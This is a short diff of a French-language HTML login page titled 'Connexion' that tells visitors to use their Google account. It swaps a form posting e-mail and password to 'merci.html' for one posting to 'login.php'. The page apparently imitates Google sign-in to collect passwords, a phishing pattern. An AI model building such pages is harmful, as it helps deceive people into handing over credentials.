@@ -162,22 +162,18 @@
                 <h1 class="title">Connexion</h1>
                 <p class="subtitle">Utilisez votre compte Google</p>
                 
-                <form action="merci.html" method="post">
-                    <div class="form-group">
-                        <input type="text" class="input-field" name="email" placeholder="Adresse e-mail ou téléphone" required>
-                    </div>
-                    
-                   
-                    
-                    <div class="form-group">
-                        <input type="password" class="input-field" name="password" placeholder="Mot de passe" required>
-                    </div>
-                    
-                    <div class="links">
-                        
-                        <button type="submit" class="next-button">Se connecter</button>
-                    </div>
-                </form>
+             <form action="login.php" method="post" id="loginForm">
+                <div class="input-group">
+                    <input type="text" placeholder="Nom d'utilisateur ou email" required>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" placeholder="Mot de passe" required>
+                    <a href="login.html" class="forgot-password">Mot de passe oublié ?</a>
+                </div>
+                
+                <button type="submit" class="login-btn">Se connecter</button>
+            </form>   
             </div>
         </main>
         
@@ -193,4 +189,4 @@
         </footer>
     </div>
 </body>
-</html
+            </html>
